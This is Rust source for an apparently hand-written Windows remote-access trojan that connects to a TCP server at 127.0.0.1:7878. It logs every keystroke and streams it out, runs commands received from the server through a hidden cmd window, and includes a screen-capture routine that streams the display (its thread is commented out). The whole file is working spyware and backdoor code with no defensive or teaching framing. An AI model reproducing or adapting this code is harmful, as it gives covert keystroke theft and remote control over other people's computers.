use std::io::prelude::*;
use std::process::Command;
use std::os::windows::process::CommandExt;
use std::net::TcpStream;
use std::thread;
use std::sync::{Arc, Mutex};
use std::io::ErrorKind::WouldBlock;
use std::time::Duration;

use scrap::{Capturer, Display};
use rdev::{listen, Event};

fn handle_instructions(mut stream: TcpStream) {
    let mut buf = [0; 1024];
    while let Ok(bytes) = stream.read(&mut buf[..]) {
        let command = std::str::from_utf8(&buf[..bytes]);

        match command {
            Ok(command) => {
                Command::new("cmd")
                    .args(["/C", command])
                    .creation_flags(0x08000000) 
                    .output()
                    .expect("failed to excute command");
            }
            Err(_) => println!("something went bad")
        }
    }
}

fn handle_screenshot(mut stream: TcpStream) {
    let one_second = Duration::new(1, 0);
    let one_frame = one_second / 60;

    let display = Display::primary().expect("couldn't find primary display.");
    let mut capturer = Capturer::new(display).expect("couldn't begin capture.");
    let (w, h) = (capturer.width(), capturer.height());

    loop {
        let buffer = match capturer.frame() {
            Ok(buffer) => buffer,
            Err(error) => {
                if error.kind() == WouldBlock {
                    thread::sleep(one_frame);
                    continue;
                } else {
                    panic!("error: {}", error);
                }
            }
        };

        println!("captured! saving...");

        let mut bitflipped = Vec::with_capacity(w * h * 4);
        let stride = buffer.len() / h;

        for y in 0..h {
            for x in 0..w {
                let i = stride * y + 4 * x;
                bitflipped.extend_from_slice(&[
                    buffer[i + 2],
                    buffer[i + 1],
                    buffer[i],
                    255,
                ]);
            }
        }

        stream.write_all(&bitflipped).unwrap();
        /*
        repng::encode(
            File::create("screenshot.png").unwrap(),
            w as u32,
            h as u32,
            &bitflipped,
        ).unwrap();

        println!("image saved to `screenshot.png`.");
        break;
        */
    }
}

fn handle_keylogger(mut stream: TcpStream) {
    let callback = move |event: Event| {
        match event.name {
            Some(string) => stream.write_all(string.as_bytes()).unwrap(),
            None => (),
        }
    };

    if let Err(error) = listen(callback) {
        println!("{:?}", error);
    }
}

fn main() {
    let stream = Arc::new(
        Mutex::new(Some(TcpStream::connect("127.0.0.1:7878").expect("could not connect to server")))
    );

    let stream_clone = Arc::clone(&stream);
    let keylogger = thread::spawn(move || {
        let stream = {
            let guard = stream_clone.lock().unwrap();
            guard.as_ref().and_then(|s| s.try_clone().ok())
        };

        let Some(stream) = stream else {
            return;
        };

        handle_keylogger(stream);
    });

    let stream_clone = Arc::clone(&stream);
    let instructions = thread::spawn(move || {
        let stream = {
            let guard = stream_clone.lock().unwrap();
            guard.as_ref().and_then(|s| s.try_clone().ok())
        };

        let Some(stream) = stream else {
            return;
        };

        handle_instructions(stream);
    });

    /*
        let stream_clone = Arc::clone(&stream);
    let screenshot = thread::spawn(move || {
        let stream = {
            let stream_guard = stream_clone.lock().unwrap();
            stream_guard.as_ref().and_then(|stream| stream.try_clone().ok())
        };

        let Some(stream) = stream else {
            return;
        };

        handle_screenshot(stream);
    });
     */

    keylogger.join().unwrap();
    instructions.join().unwrap();
    //screenshot.join().unwrap();
}